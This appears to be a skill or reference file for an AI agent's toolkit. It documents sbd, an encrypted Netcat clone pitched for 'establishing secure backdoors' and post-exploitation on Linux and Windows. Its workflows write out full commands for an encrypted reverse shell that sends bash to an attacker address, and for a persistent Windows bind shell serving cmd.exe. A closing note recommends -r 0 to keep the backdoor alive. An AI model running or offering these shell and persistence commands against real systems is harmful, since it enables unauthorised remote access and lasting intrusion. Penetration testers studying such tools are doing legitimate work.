---
name: sbd
description: A Netcat-clone designed for portability and security, featuring built-in AES-CBC-128 + HMAC-SHA1 encryption. Use for establishing secure backdoors, remote shell access, or encrypted data transfer during post-exploitation and lateral movement on both Linux and Windows systems.
---

# sbd

## Overview
sbd is a secure Netcat-clone that provides strong encryption and program execution capabilities. It is highly portable, running on both Unix-like systems and Win32, making it ideal for cross-platform post-exploitation tasks. Category: Post-Exploitation / Windows Resources.

## Installation (if not already installed)
Assume sbd is already installed. If the command is missing:

```bash
sudo apt update && sudo apt install sbd
```

## Common Workflows

### Encrypted Reverse Shell (Linux)
On the listener (attacker):
```bash
sbd -l -p 4444 -v
```
On the target:
```bash
sbd <attacker-ip> 4444 -e bash
```

### Persistent Encrypted Bind Shell (Windows)
On the target (listening):
```bash
sbd -l -p 4444 -e cmd.exe -r 0 -k MySecretPass
```
On the attacker (connecting):
```bash
sbd <target-ip> 4444 -k MySecretPass
```

### Encrypted File Transfer
On the receiving end:
```bash
sbd -l -p 9999 > received_file
```
On the sending end:
```bash
sbd <target-ip> 9999 < file_to_send
```

## Complete Command Reference

### Usage Modes
- **Connect (TCP):** `sbd [-options] host port`
- **Listen (TCP):** `sbd -l -p port [-options]`

### General Options

| Flag | Description |
|------|-------------|
| `-l` | Listen for incoming connection |
| `-p n` | Choose port to listen on, or source port to connect out from |
| `-a address` | Choose an address to listen on or connect out from |
| `-e prog` | Program to execute after connect (e.g., `-e cmd.exe` or `-e bash`) |
| `-r n` | Infinitely respawn/reconnect; pause for `n` seconds between attempts. `-r0` acts as a regular daemon re-listening after disconnect |
| `-c on\|off` | Encryption on/off (AES-CBC-128 + HMAC-SHA1). Default: `on` |
| `-k secret` | Override default phrase for encryption (must be shared between client and server) |
| `-q` | Quiet mode; don't print anything (overrides `-v`) |
| `-v` | Verbose output |
| `-n` | Toggle numeric-only IP addresses (skip DNS resolution). Specifying twice toggles back |
| `-m` | Toggle monitoring (snooping) on/off (used with `-e`). Also enabled by `-vv` |
| `-P prefix` | Add prefix + hardcoded separator to all outbound data (useful for "chat mode") |
| `-H on\|off` | Highlight incoming data with color escape sequence. Default: `off` |
| `-V` | Print version banner and exit |

### Unix-like OS Specific Options

| Flag | Description |
|------|-------------|
| `-s` | Invoke a shell. If sbd is setuid 0, it invokes a root shell |
| `-w n` | "Immobility timeout" in seconds for idle read/write and program execution |
| `-D on\|off` | Fork and run in background (daemonize). Default: `off` |

## Notes
- **Encryption**: Encryption is enabled by default. Both sides must use the same key (`-k`) and encryption setting (`-c`).
- **Persistence**: The `-r 0` flag is particularly useful on listeners to ensure the backdoor stays up after a session is closed.
- **Security**: While sbd provides encryption, it does not provide certificate-based authentication; anyone with the shared secret can connect.